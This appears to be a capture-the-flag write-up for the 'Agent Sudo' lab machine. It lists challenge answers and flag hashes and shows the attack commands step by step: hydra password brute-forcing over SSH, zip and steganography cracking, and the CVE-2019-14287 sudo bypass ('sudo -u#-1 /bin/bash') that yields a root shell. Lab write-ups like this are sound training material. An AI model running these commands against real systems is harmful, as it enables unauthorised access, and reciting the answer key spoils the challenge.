# AGENT SUDO

## BASIC INFO

```
export IP=10.10.58.24


```
## ENUMERATE

> - **How many open ports?**
>> 3

> - **How you redirect yourself to a secret page?**
>> user-agent

Stated on the web page

> - **What is the agent name?**
>> chris

Brute-forcing the agent code reveals the name. Refer to this [code](user_agent.py) for more details.

## HASH CRACKING AND BRUTE-FORCE

> - **FTP password**
>> crystal

Using `hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://$IP`

> - **Zip file password**
>> alien

binwalk found zip file in `cutie.png`. Using zip2john and john to crack the password.

> - **Steg password**
>> Area51

In ToAgentR.txt found a base64 encoded string which translate to `Area51`

> - **Who is the other agent (in full name)?**
>> james

After extract with `steghide extract -sf cute-alien.jpg` found username `james` and password `hackerrules!`.

> - **SSH password**
>> hackerrules!

## CAPTURE THE USER FLAG

> - **What is the user flag?**
>> b03d975e8c92a7c04146cfa7a5a313c7

> - **What is the incident of the photo called?**
>> Roswell alien autopsy

Reverse image search

## PRIVILEGE ESCALATION

> - **CVE number for the escalation**
>> CVE-2019-14287

sudo vulnerabilities allows user to bypass password.

> - **What is the root flag?**
>> b53a02f55b57d4439e3341834d70c062

Running the command `sudo -u#-1 /bin/bash` spawn us a root shell.

> - **(Bonus) Who is Agent R?**
>> DesKel